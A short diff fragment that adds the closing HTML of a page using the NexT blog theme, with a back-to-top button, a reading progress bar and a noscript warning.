+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
